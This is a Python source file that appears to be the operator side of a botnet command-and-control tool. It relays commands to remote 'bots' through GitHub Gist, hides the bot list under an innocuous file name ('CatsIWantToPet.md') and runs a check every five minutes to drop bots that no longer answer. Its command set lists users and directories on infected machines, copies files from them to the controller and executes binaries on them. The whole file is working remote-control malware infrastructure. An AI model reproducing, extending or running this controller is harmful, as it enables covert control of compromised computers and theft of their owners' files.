import os
import sys
import time
from Controller import gist
from Controller.Commands import ping
from Controller.Commands.ls_bots import list_current_bots
from threading import Thread
from timeit import default_timer as timer


# TODO cmd for ending controller

def reader():
    print("Waiting for input (type help for help 🙃)")

    while True:
        read = sys.stdin.readline()
        cmd = read.split()
        if len(cmd) == 0: continue
        match cmd[0]:
            case "ls_bots":
                print("LS_BOTS added to execute list", file=sys.stderr)
                EXECUTE_CMDS.append(["ls_bots"])
            case "w":
                if len(cmd) <= 1:
                    print("Not enough parameters", file=sys.stderr)
                    continue
                print("W added to execute list", file=sys.stderr)
                EXECUTE_CMDS.append(["w", cmd[1]])
            case "ls":
                if len(cmd) <= 2:
                    print("Not enough parameters", file=sys.stderr)
                    continue
                print("LS added to execute list", file=sys.stderr)
                EXECUTE_CMDS.append(["ls", cmd[1], cmd[2]])
            case "id":
                if len(cmd) <= 1:
                    print("Not enough parameters", file=sys.stderr)
                    continue
                print("ID added to execute list", file=sys.stderr)
                EXECUTE_CMDS.append(["id", cmd[1]])
            case "cp":
                if len(cmd) <= 2:
                    print("Not enough parameters", file=sys.stderr)
                    continue
                print("CP added to execute list", file=sys.stderr)
                EXECUTE_CMDS.append(["cp", cmd[1], cmd[2]])
            case "exec":
                if len(cmd) <= 2:
                    print("Not enough parameters", file=sys.stderr)
                    continue
                print("EXEC added to execute list", file=sys.stderr)
                EXECUTE_CMDS.append(["exec", cmd[1], cmd[2]])
            case _:
                print("usage: <command name> [bot name] [parameter1 ...]\n\n"
                      "\tls_bots \t\t\t\t\t(lists all currently available bots)\n"
                      "\tw  <bot filename> \t\t\t(lists users currently logged in)\n"
                      "\tls <bot filename> <PATH> \t(list content of specified directory using ls -la)\n"
                      "\tid <bot filename> \t\t\t(id of current user)\n"
                      "\tcp <bot filename> <PATH> \t(copy fole from the bot to controller)\n"
                      "\texec <bot filename> <PATH> \t(execute a binary inside the bot given the name of the binary)\n")


def executor():
    start = timer()
    while True:
        if len(EXECUTE_CMDS) == 0:
            time.sleep(1)
        else:
            cmd = EXECUTE_CMDS.pop(0)
            match cmd[0]:
                case "ls_bots":
                    print("ls_bots executing", file=sys.stderr)
                    list_current_bots(GIST_API, BOT_LIST)

                case "w":
                    print("w executing", file=sys.stderr)
                    if gist.send_command(GIST_API,  "w", cmd[1]):
                        if gist.check_response(GIST_API, cmd[1]):
                            gist.print_response(GIST_API, cmd[1])

                case "ls":
                    print("ls {} executing".format(cmd[2]), file=sys.stderr)
                    if gist.send_command(GIST_API, "ls", cmd[1], cmd[2]):
                        if gist.check_response(GIST_API, cmd[1]):
                            gist.print_response(GIST_API, cmd[1])

                case "id":
                    print("id executing", file=sys.stderr)
                    if gist.send_command(GIST_API, "id", cmd[1]):
                        if gist.check_response(GIST_API, cmd[1]):
                            gist.print_response(GIST_API, cmd[1])

                case "cp":
                    print("cp {} executing".format(cmd[2]), file=sys.stderr)
                    if gist.send_command(GIST_API, "cp", cmd[1], cmd[2]):
                        if gist.check_response(GIST_API, cmd[1]):
                            gist.save_file_response(GIST_API, cmd[1], cmd[2])
                            print("{} SUCCESSFULLY COPIED (see copies dir)".format(cmd[2]), file=sys.stderr)

                case "exec":
                    print("exec {} executing".format(cmd[2]), file=sys.stderr)
                    if gist.send_command(GIST_API, "exec", cmd[1], cmd[2]):
                        if gist.check_response(GIST_API, cmd[1]):
                            gist.print_response(GIST_API, cmd[1])

                case _:
                    print("Unknown command" + cmd[0])

        # Check if the bots are alive every 5 minutes
        if timer() - start > 300:  # TODO: 5 min = 300 s
            # Reset bots
            response_time = 15
            print("----- CHECKING ALIVE BOTS -----", file=sys.stderr)
            ping.send(GIST_API, BOT_LIST)

            print("WAITING FOR BOTS TO RESPOND", file=sys.stderr, end="")
            for i in range(response_time, 0, -1):
                time.sleep(1)
                print(".", file=sys.stderr, end="")

            # Check if bots are alive -> remove dead
            print("\nREMOVING DEAD BOTS", file=sys.stderr)
            ping.check(GIST_API, BOT_LIST)
            start = timer()
            print("----- BOT CHECK COMPLETE -----", file=sys.stderr)


# Prepare helper folder (tmp directory)
if not os.path.exists('tmp'):
    os.mkdir('tmp')

if not os.path.exists('copied'):
    os.mkdir('copied')

# Define parameters
EXECUTE_CMDS = []
BOT_LIST = "CatsIWantToPet.md"
GIST_API = gist.get_gist_api()

# Create init bot list on gist
gist.init_bot_list(GIST_API, BOT_LIST)

# Run threads for reading and executing
reader_thread = Thread(target=reader)
executor_thread = Thread(target=executor)
reader_thread.start()
executor_thread.start()

# Cleanup helper folder (tmp directory)
# os.rmdir('tmp')
